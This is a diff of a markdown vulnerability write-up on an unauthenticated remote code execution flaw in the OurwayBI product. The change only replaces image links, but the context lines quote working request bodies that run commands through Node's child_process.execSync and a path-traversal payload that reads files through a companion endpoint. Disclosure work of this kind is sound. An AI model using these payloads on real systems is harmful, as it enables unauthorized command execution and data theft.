@@ -70,7 +70,9 @@ Two further mistakes compound the first:
 2. **Wrong execution order**: the evaluation precedes `loginVerifyToken()`, so
    malicious code executes even when no valid token is presented.
 
-![image-20261111192248378](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261111192248378.png)
+
+<img width="2559" height="1527" alt="image" src="https://github.com/user-attachments/assets/37b85c64-727d-4e1f-8fb1-094fe2032f27" />
+
 
 The code in the screenshot is `img.src.js`, obtained by deobfuscating the
 Babel-compressed `img.js`.
@@ -92,7 +94,9 @@ Connection: close
 {"fprop":"require('child_process').execSync('sleep 5').toString()"}
 ```
 
-![image-20261111193014429](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261111193014429.png)
+
+<img width="2508" height="717" alt="image" src="https://github.com/user-attachments/assets/a7b4886b-bf04-4b60-8c2b-c023352aa68e" />
+
 
 ### 4.2 Writing command output to disk
 
@@ -106,7 +110,9 @@ Connection: close
 {"fprop":"require('child_process').execSync('id > /tmp/tomcat.112121').toString()"}
 ```
 
-![image-20261111194259978](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261111194259978.png)
+
+<img width="2100" height="705" alt="image" src="https://github.com/user-attachments/assets/0096e8cc-140b-41f0-879a-4b8e0573ad9c" />
+
 
 The output is retrieved through the companion arbitrary-file-read endpoint of
 the same product:
@@ -120,7 +126,9 @@ Content-Length: 47
 {"paths":["../../../../../../../..//tmp/tomcat.112121"]}
 ```
 
-![image-20261111194308183](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261111194308183.png)
+
+<img width="2471" height="693" alt="image" src="https://github.com/user-attachments/assets/db1ae5a8-a3de-4a72-ba72-b3f71f962e74" />
+
 
 ### 4.3 Reverse shell
 
@@ -145,7 +153,9 @@ The helper is reused in more than twenty places: `utils/APIService/*.js`
 BuilderService), `helpers/graphql.js`, `helpers/Html.js` and others. This is a
 systemic design flaw rather than an isolated oversight.
 
-![image-20261108212217468](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261108212217468.png)
+
+<img width="1872" height="1398" alt="image" src="https://github.com/user-attachments/assets/a232d501-d048-466c-ad85-54ca084117af" />
+
 
 ## 6. Proof of concept
 
